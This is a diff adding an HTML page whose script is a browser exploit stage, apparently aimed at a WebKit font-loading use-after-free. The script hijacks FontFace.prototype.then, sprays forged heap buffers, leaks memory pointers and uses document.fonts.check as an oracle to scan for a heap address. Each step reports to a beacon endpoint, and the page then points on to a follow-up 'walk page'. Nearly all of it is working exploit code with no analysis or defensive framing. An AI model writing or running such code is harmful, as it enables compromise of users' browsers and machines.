@@ -1,0 +1,168 @@
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>p818v24</title></head>
+<body>
+<div id="verdict" style="position:sticky;top:0;z-index:9;font:700 15px monospace;padding:.5rem;background:#fff4d6;color:#5a4300;border-bottom:2px solid #d7b34a">v24 L2-anchor sl=__SLICE__</div>
+<pre id="out">p818v24 slice __SLICE__</pre>
+<script>
+'use strict';
+var SL=__SLICE__;
+var O=document.getElementById('out'),UID=Math.random().toString(36).slice(2,8).toUpperCase();
+function b(m){try{O.textContent+='\n'+m;}catch(e){}}
+function bs(m){try{var x=new XMLHttpRequest();x.open('GET','/beacon/P817-'+encodeURIComponent(m)+'?t='+Date.now()+'&u='+UID,false);x.send(null);}catch(e){try{b(m);}catch(e2){}}}
+bs('BOOT');
+function verd(k,t){var v=document.getElementById('verdict');v.style.background=(k==='ok')?'#e3f5e6':'#fde2e1';v.style.color=(k==='ok')?'#0f5a20':'#8c1010';v.innerHTML=t;}
+
+var K=16, PW=60, SIZE=192, fired=false, faces=null;
+var ATTEMPT=0;
+
+function le(v,o){var x=0n;for(var k=7;k>=0;k--)x=(x<<8n)|BigInt(v[o+k]);return x;}
+function put64(u,o,x){for(var k=0;k<8;k++){u[o+k]=Number((x>>BigInt(8*k))&0xFFn);}}
+function hex(x){return '0x'+x.toString(16);}
+
+function start(){
+  ATTEMPT++;if(ATTEMPT>1){b('SKIP-2nd');verd('bad','Close browser fully, reopen');return;}
+  var vf;try{vf=new FontFace('vf','local(Helvetica)',{unicodeRange:'U+0041'});}catch(e){b('NOVF');return;}
+  try{document.fonts.add(vf);}catch(e){}
+  try{void vf.loaded;}catch(e){}
+  var fs=document.createElement('style');
+  fs.textContent='@font-face{font-family:v1;src:local(Arial);unicode-range:U+0042;}';
+  document.head.appendChild(fs);
+  Object.defineProperty(FontFace.prototype,'then',{configurable:true,get:function(){
+    if(fired)return undefined;fired=true;
+    try{fs.remove();}catch(e){}try{document.fonts.delete(this);}catch(e){}
+    try{document.body.offsetHeight;}catch(e){}
+    window.__sp=[];
+    for(var k=0;k<K;k++){
+      var w=new Uint8Array(new ArrayBuffer(SIZE));
+      w[0x82]=3;w[0]=0;w[1]=0;w[2]=0;w[3]=0x80;
+      var mj=0x1000+k;w[4]=mj&0xFF;w[5]=(mj>>8)&0xFF;w[6]=0;w[7]=0;
+      window.__sp.push(w);
+    }
+    return undefined;
+  },set:function(){}});
+  document.fonts.load('1em vf, v1','AB').then(function(f){faces=f;b('RES-n'+f.length);setTimeout(phase,PW);},
+                                               function(e){b('RJ-'+String(e&&e.name));});
+  setTimeout(function(){if(!faces)b('NOFACES');},1500);
+}
+
+function phase(){
+  var bufs=[],L1=0n,L2=0n;
+  for(var i=0;i<window.__sp.length;i++){
+    var a=le(window.__sp[i],0x58),c=le(window.__sp[i],0x68);
+    if(a>0x1000000000n){bufs.push([window.__sp[i],c]);if(L1===0n){L1=a;L2=c;}}
+  }
+  b('L1-'+hex(L1));b('L2-'+hex(L2));bs('L1-'+hex(L1));bs('L2-'+hex(L2));
+  if(!bufs.length||L2===0n){b('NOLEAK');window.__sp=null;faces=null;fired=false;verd('bad','NOLEAK — close browser fully, reopen');return;}
+
+  // L2 high dword: for L2 ~ 0x10XXXXXXXXX the u32 at +0x6C = 0x10 = 16
+  var l2hi=Number((L2>>32n)&0xFFFFFFFFn);
+  b('L2HI-'+l2hi);bs('L2HI-'+l2hi);
+
+  for(var ib=0;ib<bufs.length;ib++){
+    var vb=bufs[ib][0];
+    vb[0]=2;put64(vb,0x08,bufs[ib][1]);vb[0x10]=0;vb[0x82]=0;
+  }
+  b('FORGED-'+bufs.length);
+
+  setTimeout(function(){
+    for(var i2=0;i2<faces.length;i2++){try{faces[i2].family='zz'+i2;}catch(e){}}
+    setTimeout(function(){
+      for(var i3=0;i3<faces.length;i3++){try{document.fonts.add(faces[i3]);}catch(e){}}
+      setTimeout(function(){
+        var fam=null;
+        for(var q=0;q<faces.length;q++){var r=null;try{r=document.fonts.check('1em zz'+q,'A');}catch(e){}if(r===false){fam='zz'+q;window.__zi=q;break;}}
+        b('INTABLE-'+fam);
+        if(!fam){b('NOTIN');verd('bad','NOTIN — close browser fully, reopen');return;}
+        for(var is2=0;is2<bufs.length;is2++){bufs[is2][0][0x28]=1;bufs[is2][0][0x2C]=1;}
+
+        var self=0n,selfFound=false,n3=0;
+        var BUDGET=140;
+        var chkS='1em '+fam;
+        var cp0=String.fromCodePoint(0);
+        var cpHi=String.fromCodePoint(l2hi);
+        var cpHiM1=String.fromCodePoint(Math.max(0,l2hi-1));
+
+        function chk(cc){try{return document.fonts.check(chkS,cc);}catch(e){return null;}}
+
+        function setAddr(addr){
+          for(var ir=0;ir<bufs.length;ir++){
+            bufs[ir][0][0x20]=Number(addr&0xFFn);
+            bufs[ir][0][0x21]=Number((addr>>8n)&0xFFn);
+            bufs[ir][0][0x22]=Number((addr>>16n)&0xFFn);
+            bufs[ir][0][0x23]=Number((addr>>24n)&0xFFn);
+            bufs[ir][0][0x24]=Number((addr>>32n)&0xFFn);
+            bufs[ir][0][0x25]=0;bufs[ir][0][0x26]=0;bufs[ir][0][0x27]=0;
+          }
+        }
+
+        // detect reclaim lane: aim at candidate+0x6C reads L2 high dword as from
+        // reclaim lane: from=l2hi (e.g. 0x10=16), spray-only: from=0
+        function checkAddr(addr){
+          setAddr(addr+0x6Cn);n3++;
+          if(n3>BUDGET)return false;
+          var r0=chk(cp0);
+          if(r0===false){
+            // from > 0 at this address — candidate hit
+            n3+=2;
+            var rH=chk(cpHi);
+            var rM=chk(cpHiM1);
+            if(rH===true&&rM===false){
+              // from = exactly l2hi — strong match
+              return true;
+            }
+          }
+          return false;
+        }
+
+        // L2-anchored scan: start from L2, step ±0xC0 (192B bmalloc class)
+        // alternating outward: +1, -1, +2, -2, ...
+        var STEP=0xC0n;
+        var CANDS=140,TOTAL=21000;
+        var si=SL*CANDS,ei=Math.min(si+CANDS,TOTAL);
+        if(si>=TOTAL){bs('P818-NOSELF-DONE-sl='+SL);verd('bad','All '+TOTAL+' tested');return;}
+
+        // anchor: L2 rounded down to nearest 0xC0 boundary
+        var anchor=L2-(L2%STEP);
+        function candAddr(idx){
+          // alternating: idx 0 → +0, 1 → +1, 2 → -1, 3 → +2, 4 → -2, ...
+          var half=Math.floor((idx+1)/2);
+          var sign=(idx%2===1)?1n:-1n;
+          if(idx===0)return anchor;
+          return anchor+sign*BigInt(half)*STEP;
+        }
+        var r0a=candAddr(si),r1a=candAddr(Math.min(ei-1,TOTAL-1));
+        b('SCAN sl='+SL+' anch='+hex(anchor)+' ['+hex(r0a)+'..'+hex(r1a)+'] n='+(ei-si));
+        bs('SCAN-sl='+SL+'-anch='+hex(anchor));
+        var idx=si;
+        function scanStep(){
+          var batch=10;
+          for(var j=0;j<batch&&idx<ei;j++,idx++){
+            if(n3>=BUDGET)break;
+            if(checkAddr(candAddr(idx))){
+              self=candAddr(idx);selfFound=true;break;
+            }
+          }
+          if(selfFound){afterSelf();return;}
+          if(idx>=ei||n3>=BUDGET){
+            bs('P818-NOSELF-sl='+SL+'-n3='+n3+'-anch='+hex(anchor));
+            b('NOSELF sl='+SL+' ('+n3+' calls)');
+            verd('bad','NOSELF sl='+SL+' — close browser fully, reopen');
+            window.__sp=null;faces=null;
+            return;
+          }
+          setTimeout(scanStep,0);
+        }
+        scanStep();
+
+        function afterSelf(){
+          bs('P818-SELF-'+hex(self)+'-sl='+SL+'-n3='+n3);
+          b('SELF='+hex(self)+' sl='+SL+' n3='+n3);
+          verd('ok','SELF='+hex(self)+' sl='+SL+' — load walk page');
+        }
+      },40);
+    },30);
+  },40);
+}
+
+if(document.readyState==='complete'||document.readyState==='interactive')setTimeout(start,0);
+else document.addEventListener('DOMContentLoaded',start);
+</script></body></html>
